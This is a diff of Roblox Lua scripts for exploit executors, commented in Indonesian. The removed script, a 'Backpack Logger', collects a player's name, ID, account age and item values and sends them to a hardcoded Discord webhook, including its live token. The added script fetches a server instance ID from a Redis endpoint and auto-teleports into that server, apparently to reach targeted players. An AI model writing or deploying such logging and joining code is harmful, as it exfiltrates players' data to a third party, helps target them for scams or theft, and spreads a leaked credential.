@@ -1,147 +1,75 @@
-local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
+local HttpService = game:GetService("HttpService")
 
--- 1. FUNGSI UTAMA YANG DIPERBAIKI
-local function sendBackpackToDiscord()
-    -- Fungsi untuk parsing angka yang aman
-    local function safeParseNumber(str, default)
-        if type(str) == "number" then return str end
-        if type(str) ~= "string" then return default end
-        local numStr = string.match(str, "[%d%.]+") or ""
-        return tonumber(numStr) or default
-    end
+-- Konfigurasi
+local REDIS_API_URL = "https://gentle-bengal-35395.upstash.io"  -- Ganti dengan URL endpoint Redis Anda
+local MAX_RETRIES = 5
+local RETRY_DELAY = 10
+local PLACE_ID = 126884695634066  -- Ganti dengan ID game target
 
-    -- Format angka dengan koma
-    local function formatNumberWithCommas(n)
-        local num = math.floor(safeParseNumber(n, 0))
-        return tostring(num):reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", "")
-    end
-
-    -- 2. DATA PLAYER
-    local player = Players.LocalPlayer
-    local success, userId = pcall(function() return player.UserId end)
-    if not success then userId = 0 end
+-- Fungsi untuk mendapatkan instanceId dari Redis
+local function getInstanceFromRedis()
+    local httpRequest = (syn and syn.request) or (http_request or request or (fluxus and fluxus.request) or http)
     
-    local playerName = player.Name
-    local accountAge = player.AccountAge
-    local profileUrl = "https://www.roblox.com/users/" .. userId .. "/profile"
-
-    -- 3. PROSES BACKPACK DENGAN ERROR HANDLING
-    local backpackItems = {}
-    local backpackSuccess, backpack = pcall(function() return player:WaitForChild("Backpack", 5) end)
-    
-    if backpackSuccess and backpack then
-        for _, item in ipairs(backpack:GetChildren()) do
-            local success, itemData = pcall(function()
-                local weight = safeParseNumber(item:GetAttribute("Weight"), 0)
-                local age = safeParseNumber(item:GetAttribute("Age"), 1)
-                local value = safeParseNumber(item:GetAttribute("Value"), 0)
-                
-                local itemName = item.Name
-                if item:GetAttribute("IsCelestial") then
-                    itemName = "[Celestial] " .. itemName
-                end
-                
-                return {
-                    text = string.format("%s [%.2f KG] [Age %d] → %s#", 
-                        itemName, weight, age, formatNumberWithCommas(value)),
-                    value = value
-                }
-            end)
-            
-            if success and itemData then
-                table.insert(backpackItems, itemData)
-            end
-        end
+    if not httpRequest then
+        warn("Executor tidak mendukung HTTP request!")
+        return nil
     end
 
-    -- 4. SORTING DAN FORMATTING
-    table.sort(backpackItems, function(a, b) return a.value > b.value end)
-    
-    local backpackDisplay = {}
-    for _, item in ipairs(backpackItems) do
-        table.insert(backpackDisplay, item.text)
-    end
-    
-    local backpackStr = #backpackDisplay > 0 and table.concat(backpackDisplay, "\n") or "Kosong"
-    backpackStr = string.sub(backpackStr, 1, 3000) -- Batasi karakter
-
-    -- 5. WEBHOOK REQUEST YANG LEBIH TAHAN BANTING
-    local webhookUrl = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
-    
-    -- Deteksi executor yang tersedia
-    local requestFunc
-    local executors = {
-        syn = syn and syn.request,
-        fluxus = fluxus and fluxus.request,
-        krnl = krnl and krnl.request,
-        http = http_request or request
-    }
-    
-    for _, func in pairs(executors) do
-        if type(func) == "function" then
-            requestFunc = func
-            break
-        end
-    end
-
-    if not requestFunc then
-        warn("Tidak ditemukan fungsi request yang didukung")
-        return false
-    end
-
-    -- 6. PREPARASI PAYLOAD
-    local embed = {
-        title = "📦 Informasi Backpack",
-        color = 0x3498db,
-        fields = {
-            {name = "👤 Player", value = string.format("`%s` (ID: `%d`)", playerName, userId), inline = true},
-            {name = "⏳ Umur Akun", value = string.format("%d hari", accountAge), inline = true},
-            {name = "🎒 Isi Backpack", value = "```\n" .. backpackStr .. "\n```", inline = false}
-        },
-        footer = {text = "Backpack Logger - " .. os.date("%X")},
-        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-    }
-
-    -- 7. KIRIM REQUEST DENGAN RETRY
-    local function sendRequest(payload)
-        for i = 1, 3 do -- Coba 3 kali
-            local response
-            local success, err = pcall(function()
-                response = requestFunc({
-                    Url = webhookUrl,
-                    Method = "POST",
-                    Headers = {["Content-Type"] = "application/json"},
-                    Body = HttpService:JSONEncode(payload)
-                })
-            end)
-            
-            if success and response and (response.StatusCode == 200 or response.StatusCode == 204) then
-                return true
-            end
-            wait(2) -- Tunggu 2 detik sebelum retry
-        end
-        return false
-    end
-
-    -- 8. EKSEKUSI FINAL
-    local success = sendRequest({
-        username = "🎒 Backpack Logger",
-        avatar_url = "https://i.imgur.com/0y0F0Gj.png",
-        embeds = {embed}
+    local response = httpRequest({
+        Url = REDIS_API_URL,
+        Method = "GET"
     })
 
-    if success then
-        print("✅ Berhasil mengirim ke webhook!")
-        return true
+    if response and response.StatusCode == 200 then
+        local data = HttpService:JSONDecode(response.Body)
+        return data.instanceId
     else
-        warn("❌ Gagal mengirim setelah 3 percobaan")
-        return false
+        warn("Gagal mendapatkan instanceId dari Redis:", response and response.StatusCode or "No response")
+        return nil
     end
 end
 
--- Jalankan fungsi utama
-local success = sendBackpackToDiscord()
-if not success then
-    warn("Proses pengiriman webhook mengalami kegagalan total")
+-- Fungsi untuk join ke instance
+local function joinInstance(instanceId)
+    local success, err = pcall(function()
+        TeleportService:TeleportToPlaceInstance(PLACE_ID, instanceId, Players.LocalPlayer)
+    end)
+    
+    if not success then
+        warn("Gagal join ke instance:", err)
+        return false
+    end
+    return true
 end
+
+-- Fungsi utama auto joiner
+local function autoJoin()
+    local retries = 0
+    
+    while retries < MAX_RETRIES do
+        retries = retries + 1
+        print("Mencoba bergabung... Percobaan ke-"..retries)
+        
+        local instanceId = getInstanceFromRedis()
+        if instanceId then
+            print("Mendapatkan instanceId:", instanceId)
+            if joinInstance(instanceId) then
+                print("Berhasil memulai proses join!")
+                return
+            end
+        else
+            print("Tidak mendapatkan instanceId dari Redis")
+        end
+        
+        if retries < MAX_RETRIES then
+            wait(RETRY_DELAY)
+        end
+    end
+    
+    warn("Gagal bergabung setelah "..MAX_RETRIES.." percobaan")
+end
+
+-- Mulai proses auto join
+autoJoin()
